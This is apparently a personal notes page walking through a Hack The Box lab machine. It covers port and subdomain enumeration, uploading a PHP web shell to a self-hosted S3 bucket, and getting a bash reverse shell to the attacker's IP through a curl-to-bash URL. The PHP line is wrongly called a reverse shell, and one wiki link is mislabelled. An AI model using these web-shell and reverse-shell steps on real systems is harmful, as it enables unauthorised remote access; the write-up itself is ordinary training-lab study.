---
tags: [archive, hackthebox, s3, php, webshell]
platform: Hack The Box
tier: "1"
status: archived
---

- `nmap -sC -sV -sT 10.129.183.242` to count open TCP ports.
- Domain in the site's Contact section email address: `thetoppers.htb`
- Linux file used to resolve hostnames without a DNS server: `/etc/hosts`
- Sub-domain found via further enumeration:

  ```bash
  gobuster vhost -w /usr/share/wordlists/subdomains-top1million-5000.txt -u thetoppers.htb --append-domain
  ```

- Service running on that sub-domain: Amazon S3 (self-hosted)
- CLI utility to interact with it: `awscli`
- Command to set up the AWS CLI: `aws configure`
- List all S3 buckets: `aws --endpoint-url=http://s3.thetoppers.htb s3 ls`
- Scripting language the server runs: `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb` -> PHP files present.

## Getting the Flag
Use a standard reverse shell one-liner `<?php system($_GET['cmd']);?>` that gives an interactive shell back to a listener on the attacker's machine. Upload it: `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`. We can execute code now but we still need a shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.158/1337 0>&1
```

Start listening to the port you just opened: `nc -lvp 1337
Now to connect the two set up a webserver for the remote site to connect to: `python3 -m http.server 8000
To connect: http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.158:8000/shell.sh|bash
## Why
See [[File Upload Vulnerabilities and Privilege Escalation]]. This server executes uploaded PHP directly, so the exploit is the same pattern as the picoCTF n0s4n1ty 1 challenge, just reaching the upload target through S3's [[Using Microsoft Foundry endpoints|API]] instead of a web form.
